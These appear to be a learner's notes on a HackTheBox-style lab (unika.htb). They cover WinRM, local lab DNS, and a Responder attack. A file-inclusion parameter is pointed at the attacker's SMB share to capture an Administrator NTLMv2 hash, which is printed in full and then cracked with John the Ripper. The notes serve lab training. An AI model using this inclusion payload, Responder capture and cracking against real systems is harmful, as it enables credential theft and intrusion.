## Windows Remote Management,
 or WinRM, is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. WinRM allows the user to :
  → Remotely communicate and interface with hosts
  → Execute commands remotely on systems that are not local to you but are network accessible. 
  → Monitor, manage and configure servers, operating systems and client machines from a remote location.
  As a pentester, this means that if we can find credentials (typically username and password) for a user who has remote management privileges, we can potentially get a PowerShell shell on the host

## Why won’t DNS resolve domains like `unika.htb`?**

### 💡 Because domains like `unika.htb` **don’t exist on the public internet**.

When you enter a URL like `http://google.com`, your system uses **DNS (Domain Name System)** to ask:

> “What’s the IP address of `google.com`?”

But `unika.htb` is a **fake/local domain** used for training, pentesting, or internal networks. It **was never registered** on the internet's DNS system. So when your browser tries to look it up:


Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.![[Screenshot 2025-06-16 at 20.36.26.png]]

to test for a Local File Inclusion vulnerability on a Windows machine 


## 🤖 What Responder Does:

Responder is running on **your machine** and it's listening for these types of “Who is X?” questions.

When the Windows computer shouts:

> “Who is `printer-share`?”

Responder quickly replies:

> “Hey, I'm `printer-share`! Connect to me.”

The Windows machine **believes it** and automatically tries to connect — and when it does, it **tries to log in** by sending its **username and a hashed version of the password** (called the NTLM hash)

## to start a responder server listenning for smb events 

sudo responder -I tun0

then , on the file= enter the attackbox ip address with /whatever_file
 http://unika.htb/index.php?page= //10.10.14.171/whatever
the hash looks like : NTLMv2-SSP Hash     : Administrator::RESPONDER:611c53ccf1b0ed43:4B1AE9FBB48C59B19DB3EA1682130E99:010100000000000080C55A598FDFDB016A2619CA1F5F1A030000000002000800530056004D00420001001E00570049004E002D0047004F0053005100540059004A00430031003400460004003400570049004E002D0047004F0053005100540059004A0043003100340046002E00530056004D0042002E004C004F00430041004C0003001400530056004D0042002E004C004F00430041004C0005001400530056004D0042002E004C004F00430041004C000700080080C55A598FDFDB0106000400020000000800300030000000000000000100000000200000C68A3ABCCD880FFA922F1B47F62A96295A8CA91CA2F3FFDF2467A6BC40F6485D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100370031000000000000000000

## John the ripper utility : 
used to run a brute force attack on to find the password matching this hash ;

command : john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
![[Screenshot 2025-06-17 at 20.14.25.png]]

